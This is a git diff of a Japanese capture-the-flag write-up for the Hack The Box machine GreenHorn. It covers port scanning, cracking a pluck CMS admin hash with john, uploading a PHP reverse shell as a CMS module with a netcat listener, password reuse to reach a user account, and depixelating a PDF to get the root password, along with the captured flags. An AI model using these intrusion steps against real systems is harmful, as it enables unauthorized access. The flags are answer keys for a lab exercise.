@@ -12,9 +12,53 @@
 
 # Enumeration
 ポートは20番、80番、3000番が空いてる
-3000番は、well knownポートではない
-- 
+3000番は、well knownポートではないが、httpで何らかのサイト？
 ```bash
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
+|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
+80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-title: Welcome to GreenHorn ! - GreenHorn
+|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
+|_http-generator: pluck 4.7.18
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+3000/tcp open  ppp?    syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=0be44410dbbb0381; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=wBVspdjFwYH1yysu652HFrNqycQ6MTczNTc4NjcwODUzMzU0NzE4NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 02 Jan 2025 02:58:28 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-auto">
+|     <head>
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title>GreenHorn</title>
+|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=c19aa1d7521f9074; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=qNYx5z7BM6KIUxAGzKyjjTj5vAk6MTczNTc4NjcxMzU5NzA2MjczOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 02 Jan 2025 02:58:33 GMT
+|_    Content-Length: 0
 
 ```
 
@@ -193,162 +237,136 @@ searchsploit -m php/webapps/51592.py
 ```
 
 コードの調整が必要な部分を調整する
-```bash
+Upload_URLを指定する必要があるが、アップロードするサイトの部分がないから出来なさそう
+他の手法を試す
 
+調べてると、Readme.mdが見つかったので、見ていると、
+[Plunk CMSのWiki](https://github.com/pluck-cms/pluck/wiki/Frequently-Asked-Questions)のリンクを見つけた。
+Wiki内で
+	**Changing the Password** There is way to reset a lost password. But you can modify it via ftp!
+	To do so, edit the value for ww in data\settings\pass.php
+	
+	```html
+	<?php
+	$ww = 'ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413';
+	```
+	
+	This lines change the password to "123456".
+	
+	Then login, click 'options' and change the password
+	
+	[](https://github.com/pluck-cms/pluck/wiki/_Footer/_edit "Edit footer")
+	
+	bx0
+という記述がある。この記述から、data\settings\pass.phpでパスワードを変更することができるとわかる。
+しかし、`curl -o http://greenhorn.htb/data/settings/pass.php`と直接ダウンロードしようとしても、ダウンロードできない。
+以下のようなディレクトリトラバーサル攻撃もうまく効かない
+`http://greenhorn.htb/?file=welcome-to-greenhorn....//....//....//....//data/settings/pass.php`
+
+このサーバーは、3000番からアクセスできる。
+![[Pasted image 20250102124547.png]]
+johnで解析する。
+ハッシュのパスワードが「iloveyou1」であることがわかった。
+```sh
+└──╼ [★]$ echo "d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163" > hashes.txt
+
+└──╼ [★]$ john --format=raw-sha512 hashes.txt
+Created directory: /home/snowyowl644/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+iloveyou1        (?)     
+1g 0:00:00:00 DONE 2/3 (2025-01-01 21:58) 33.33g/s 136533p/s 136533c/s 136533C/s 123456..Peter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
 ```
-- 
-- 
-- 
-- **Tactics**:
-    - #Tactic_情報収集
-    - #Tactic_探索
-- **Techniques**:
-    - #T1016_システムネットワーク構成の探索
-    - #T1046_ネットワークサービススキャン
-    - #T1057_プロセス探索`
-    - #T1018_リモートシステム探索`
-    - その他のDiscovery関連技術...
 
+sshでadmin/iloveyou1でログインしたがログインできない。
+まず、pluck CMSにadmin/iloveyou1でログイン。
+ユーザーを確認する。
 
 
 ---
 
 # Foothold
-<最初の侵入ポイントをここに書いてください>
-```bash
 
+記事を書いているMr.Greenというアカウントがあるのかと思ったけど、無さそう。
+リバースシェルを[]moduleにアップロード、インストールして、リバースシェルを確立する。
+正しく動いているときは、特にリバースシェルに明示的にアクセスしないで、勝手にリバースシェルが確立される。
+
+リバースシェルは、[https://www.revshells.com/]を使用して、PHP PentestMonkeyを使う。
+注意点として、.zipと.phpの前の名前は同じにしないと正しくインストールされないぽい。
+```bash
+nano shell.php
+zip shell.zip shell.php
 ```
 
+他のタブでリバースを待ち受ける。
 ```bash
-
+sudo nc -lvnp <PORT>
 ```
 
+リバースシェルが確立されて、whoamiをすると、Apache サーバーの Web 管理者であるwww-dataであることがわかる。
 ```bash
-
+$ whoami
+www-data
 ```
-
-```bash
-
-```
-
-```bash
-
-```
-
-
-- **Tactics**:
-    - #Tactic_初期アクセス
-    - #Tactic_Escution_実行
-- **Techniques**:
-    - #T1190_公開アプリケーションのエクスプロイト
-    - #T1059_コマンドとスクリプトインタープリタ
-    - #T1078_有効なアカウント
-    - その他のInitial Access/Execution関連技術...
-
-
 
 ---
 
 # Lateral Movement
-<横方向の動きに関する説明をここに書いてください>
+ユーザーフラグは、juniorというwww-dataとは違うアカウントのhomeフォルダ以下にある。
+先ほどのadminのパスワードと同じパスワードでユーザー切り替えができる。
 ```bash
+www-data@greenhorn:/home$ su - junior
+su - junior
+Password: iloveyou1
 
 ```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-
-
-- **Tactics**:
-    - #Tactic_横移動
-- **Techniques**:
-    - #T1021_リモートサービス
-    - #T1078_有効なアカウント
-
-
 
 
 ---
 
 # Privilege Escalation
-<特権昇格の詳細をここに記載してください>
+
+juiorの/homeの中にuser.txtの他にもpdfファイルがあったのでみてみる。
+![[Pasted image 20250102181441.png]]
+
+文字のところを複合する
+
 ```bash
+git clone https://github.com/spipm/Depix.git
+cd Depix
+```
+
+複合すると、sidefromsidetheothersidesidefromsidetheothersideであることがわかる。
+利用して、rootに権限昇格
+```bash
+www-data@greenhorn:/$ su root                   
+su root
+Password: sidefromsidetheothersidesidefromsidetheotherside
+
+root@greenhorn:/# 
 
 ```
 
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-
-
-- **Tactics**:
-    - #Tactic_特権昇格
-- **Techniques**:
-    - #T1068_特権昇格のためのエクスプロイト
-    - #T1055_プロセス注入
-    - #T1053_スケジュールされたタスク/ジョブ
-    - その他のPrivilege Escalation関連技術...
-
-
-
----
-
-## Notes
-
-- **Tactics**:
-    - #Tactic_永続化
-    - #Tactic_防御回避
-- **Techniques**:
-    - #T1098_アカウント操作
-    - #T1553_信頼制御の転覆
-    - #T1070_ホスト上の痕跡削除
-    - その他のPersistence/Defense Evasion関連技術...
-
-<このWriteupで特に重要な点や学んだことを追加で記載するセクション>
 
 ---
 ## Flags
 
-- **User**: `<md5>`
-- **Root**: `<md5>`
+- **User**: 08f08b7cf6c897d19260db2eae90e403
+- **Root**: d782ab796e204fff28c2aa2872c21a75
 ---
 
 ### ポイント
 
 
-- 簡単なポイントあったら
+- 詰まったら、一回俯瞰する(大事)
+	- 80番でdata\settings\pass.phpでアクセスできないことがわかる→俯瞰する。→3000番もhttpで探索していないことに気づく。
+	- 画像の複合化はできる。
+		- https://github.com/spipm/Depix.git
